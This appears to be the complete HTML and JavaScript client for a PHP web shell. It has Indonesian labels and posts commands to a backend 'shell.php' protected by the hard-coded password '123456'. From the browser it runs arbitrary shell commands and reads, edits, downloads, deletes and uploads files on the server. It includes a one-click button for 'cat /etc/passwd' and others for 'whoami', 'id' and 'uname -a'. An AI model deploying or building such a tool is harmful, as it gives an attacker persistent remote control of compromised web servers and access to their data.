<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Terminal</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a0a; color:#00ff00; font:16px/1.6 'Consolas','Monaco',monospace; padding:20px; }
        .container { max-width:1400px; margin:auto; }
        .header { background:#111; border:1px solid #0a0; border-radius:8px; padding:15px 20px; margin-bottom:20px; }
        .header h1 { color:#0f0; font-size:22px; }
        .sysinfo { background:#111; border:1px solid #333; border-radius:5px; padding:12px; margin-bottom:20px; font-size:13px; }
        .tab-bar { display:flex; gap:5px; border-bottom:1px solid #333; margin-bottom:20px; flex-wrap:wrap; }
        .tab { padding:8px 18px; cursor:pointer; border:1px solid transparent; border-bottom:none; border-radius:5px 5px 0 0; background:#000; color:#0f0; }
        .tab.active { background:#0a0; border-color:#0f0; border-bottom-color:#0a0a0a; }
        .panel { background:#111; border:1px solid #0a0; border-radius:8px; padding:20px; margin-bottom:20px; display:none; }
        .panel.active { display:block; }
        .panel-title { color:#0f0; font-size:18px; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px; }
        input, button, textarea, select { background:#000; color:#0f0; border:1px solid #0a0; padding:8px 12px; border-radius:4px; font:inherit; }
        button { cursor:pointer; background:#001a00; }
        button:hover { background:#003300; }
        .cmd-row { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:10px; }
        .cmd-row input { flex:1; min-width:200px; }
        .cmd-row button { min-width:100px; }
        .output { background:#000; border:1px solid #333; border-radius:4px; padding:12px; min-height:120px; max-height:400px; overflow:auto; white-space:pre-wrap; word-break:break-all; margin-top:12px; }
        .quick-btns { display:flex; flex-wrap:wrap; gap:8px; margin:12px 0; }
        .quick-btns button { padding:5px 12px; font-size:13px; }
        .file-table { width:100%; border-collapse:collapse; margin-top:10px; font-size:14px; }
        .file-table th, .file-table td { border:1px solid #333; padding:8px; text-align:left; }
        .file-table th { background:#001a00; }
        .file-table tr:nth-child(even) { background:#0d0d0d; }
        .file-table a { color:#0f0; text-decoration:none; cursor:pointer; }
        .file-table a:hover { text-decoration:underline; }
        .file-table .actions a { margin-right:10px; }
        .upload-form { display:flex; gap:15px; align-items:center; flex-wrap:wrap; margin:10px 0; }
        .upload-form input[type="file"] { border:none; background:transparent; color:#0f0; }
        .status-bar { position:fixed; bottom:0; left:0; right:0; background:#111; border-top:1px solid #0a0; padding:8px 20px; display:flex; justify-content:space-between; font-size:12px; color:#0a0; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ Remote Terminal</h1>
        <div class="sysinfo">
            <span id="curdir">/</span> &nbsp;|&nbsp; <span id="userinfo">user</span>
        </div>
    </div>

    <div class="tab-bar">
        <div class="tab active" data-tab="terminal">💻 Terminal</div>
        <div class="tab" data-tab="files">📁 File Manager</div>
        <div class="tab" data-tab="upload">⬆ Upload</div>
        <div class="tab" data-tab="editor">✏️ Editor</div>
    </div>

    <!-- Terminal Panel -->
    <div id="panel-terminal" class="panel active">
        <div class="panel-title">Perintah</div>
        <div class="cmd-row">
            <input type="text" id="cmdInput" placeholder="ketik perintah..." autofocus>
            <button id="execBtn">Jalankan</button>
        </div>
        <div class="quick-btns">
            <button onclick="runCmd('ls -la')">ls -la</button>
            <button onclick="runCmd('pwd')">pwd</button>
            <button onclick="runCmd('whoami')">whoami</button>
            <button onclick="runCmd('id')">id</button>
            <button onclick="runCmd('uname -a')">uname</button>
            <button onclick="runCmd('cat /etc/passwd')">passwd</button>
            <button onclick="cdPath('/')">Root</button>
            <button onclick="cdPath('..')">..</button>
        </div>
        <div id="terminalOutput" class="output">➤ siap menerima perintah...</div>
    </div>

    <!-- File Manager Panel -->
    <div id="panel-files" class="panel">
        <div class="panel-title">File Manager</div>
        <div style="margin-bottom:10px;">
            <button onclick="loadFiles()">⟳ Refresh</button>
            <span style="margin-left:15px;">Direktori: <span id="fileDir">/</span></span>
        </div>
        <div id="fileListContainer"><table class="file-table"><tr><th>Nama</th><th>Ukuran</th><th>Izin</th><th>Aksi</th></tr></table></div>
    </div>

    <!-- Upload Panel -->
    <div id="panel-upload" class="panel">
        <div class="panel-title">Upload File</div>
        <div class="upload-form">
            <input type="file" id="uploadFileInput">
            <button id="uploadBtn">Upload</button>
        </div>
        <div id="uploadStatus"></div>
        <p style="margin-top:10px;">File akan diunggah ke: <span id="uploadDir">/</span></p>
    </div>

    <!-- Editor Panel -->
    <div id="panel-editor" class="panel">
        <div class="panel-title">Editor</div>
        <div style="margin-bottom:8px;">
            <span>File: <span id="editFileName">(none)</span></span>
            <button onclick="saveFile()">Simpan</button>
            <button onclick="closeEditor()">Tutup</button>
        </div>
        <textarea id="editorContent" rows="15" style="width:100%;background:#000;color:#0f0;border:1px solid #0a0;padding:10px;"></textarea>
    </div>
</div>

<div class="status-bar">
    <span>Path: <span id="statusPath">/</span></span>
    <span>Status: <span id="statusMsg">siap</span></span>
</div>

<script>
// =================================================================
// Konfigurasi – ubah sesuai endpoint backend Anda
// =================================================================
const API_URL = 'shell.php'; // Ganti dengan URL backend (misal: api.php, cmd.php, atau yang lain)
const PASSWORD = '123456';   // Password yang sama dengan backend (MD5)
// =================================================================

let currentDir = '/';
let editingFile = null;

// ----- Utility: AJAX request ke backend -----
function callAPI(params, callback) {
    params.p = PASSWORD;
    const fd = new FormData();
    for (let k in params) fd.append(k, params[k]);
    fetch(API_URL, { method: 'POST', body: fd })
        .then(res => res.text())
        .then(txt => callback(txt))
        .catch(err => callback('Error: ' + err));
}

// ----- Terminal -----
function runCmd(cmd) {
    if (!cmd) return;
    document.getElementById('terminalOutput').textContent = '⏳ menjalankan...';
    callAPI({ cmd: cmd }, function(out) {
        document.getElementById('terminalOutput').textContent = out || '(tidak ada output)';
        // update path jika cd berhasil
        callAPI({ act: 'pwd' }, function(path) {
            if (path && path.trim()) {
                currentDir = path.trim();
                document.getElementById('curdir').textContent = currentDir;
                document.getElementById('fileDir').textContent = currentDir;
                document.getElementById('uploadDir').textContent = currentDir;
                document.getElementById('statusPath').textContent = currentDir;
            }
        });
    });
}

function cdPath(path) {
    callAPI({ act: 'cd', dir: path }, function(res) {
        if (res && res.trim()) {
            currentDir = res.trim();
            document.getElementById('curdir').textContent = currentDir;
            document.getElementById('fileDir').textContent = currentDir;
            document.getElementById('uploadDir').textContent = currentDir;
            document.getElementById('statusPath').textContent = currentDir;
            document.getElementById('terminalOutput').textContent = '➤ pindah ke: ' + currentDir;
            loadFiles();
        } else {
            document.getElementById('terminalOutput').textContent = '❌ gagal pindah ke: ' + path;
        }
    });
}

// ----- File Manager -----
function loadFiles() {
    callAPI({ act: 'ls' }, function(data) {
        const lines = data.split('\n').filter(l => l.trim() !== '');
        let html = `<table class="file-table">
            <tr><th>Nama</th><th>Ukuran</th><th>Izin</th><th>Aksi</th></tr>`;
        lines.forEach(name => {
            const isDir = name.endsWith('/');
            const size = isDir ? '-' : '?'; // size tidak didapat dari ls -l sederhana
            const perm = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
            html += `<tr>
                <td>${isDir ? '📁' : '📄'} ${name}</td>
                <td>${size}</td>
                <td>${perm}</td>
                <td class="actions">`;
            if (!isDir) {
                html += `<a onclick="editFile('${name}')">Edit</a> `;
                html += `<a onclick="downloadFile('${name}')">Download</a> `;
            }
            html += `<a onclick="deleteFile('${name}')">Hapus</a>`;
            html += `</td></tr>`;
        });
        html += '</table>';
        document.getElementById('fileListContainer').innerHTML = html;
    });
}

function deleteFile(path) {
    if (!confirm('Hapus ' + path + '?')) return;
    callAPI({ act: 'delete', file: path }, function(msg) {
        alert(msg || 'Dihapus');
        loadFiles();
    });
}

function downloadFile(path) {
    window.open(API_URL + '?p=' + encodeURIComponent(PASSWORD) + '&act=download&file=' + encodeURIComponent(path), '_blank');
}

function editFile(path) {
    editingFile = path;
    document.getElementById('editFileName').textContent = path;
    callAPI({ act: 'edit', file: path }, function(content) {
        document.getElementById('editorContent').value = content || '';
        switchTab('editor');
    });
}

function saveFile() {
    if (!editingFile) return alert('Tidak ada file yang diedit.');
    const content = document.getElementById('editorContent').value;
    callAPI({ act: 'edit', file: editingFile, content: content }, function(msg) {
        alert(msg || 'Disimpan');
        loadFiles();
    });
}

function closeEditor() {
    editingFile = null;
    document.getElementById('editFileName').textContent = '(none)';
    document.getElementById('editorContent').value = '';
    switchTab('files');
}

// ----- Upload -----
function uploadFile() {
    const fileInput = document.getElementById('uploadFileInput');
    if (!fileInput.files.length) return alert('Pilih file terlebih dahulu.');
    const file = fileInput.files[0];
    const fd = new FormData();
    fd.append('p', PASSWORD);
    fd.append('act', 'upload');
    fd.append('file', file);
    document.getElementById('uploadStatus').textContent = '⏳ mengupload...';
    fetch(API_URL, { method: 'POST', body: fd })
        .then(res => res.text())
        .then(msg => {
            document.getElementById('uploadStatus').textContent = '✅ ' + msg;
            loadFiles();
        })
        .catch(err => {
            document.getElementById('uploadStatus').textContent = '❌ Gagal: ' + err;
        });
}

// ----- Tab Switching -----
function switchTab(tabId) {
    document.querySelectorAll('.panel').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
    document.getElementById('panel-' + tabId).classList.add('active');
    document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
    if (tabId === 'files') loadFiles();
    if (tabId === 'terminal') document.getElementById('cmdInput').focus();
}

// ----- Inisialisasi & Event -----
window.onload = function() {
    // Ambil direktori awal
    callAPI({ act: 'pwd' }, function(path) {
        if (path && path.trim()) {
            currentDir = path.trim();
            document.getElementById('curdir').textContent = currentDir;
            document.getElementById('fileDir').textContent = currentDir;
            document.getElementById('uploadDir').textContent = currentDir;
            document.getElementById('statusPath').textContent = currentDir;
        }
    });
    // Ambil user info (opsional)
    callAPI({ cmd: 'whoami' }, function(user) {
        if (user && user.trim()) document.getElementById('userinfo').textContent = user.trim();
    });

    // Event tombol execute
    document.getElementById('execBtn').addEventListener('click', function() {
        const cmd = document.getElementById('cmdInput').value;
        runCmd(cmd);
    });
    document.getElementById('cmdInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') runCmd(this.value);
    });

    // Event upload
    document.getElementById('uploadBtn').addEventListener('click', uploadFile);

    // Event tab klik
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            const id = this.getAttribute('data-tab');
            switchTab(id);
        });
    });

    // Muat file manager awal
    loadFiles();
};
</script>
</body>
</html>
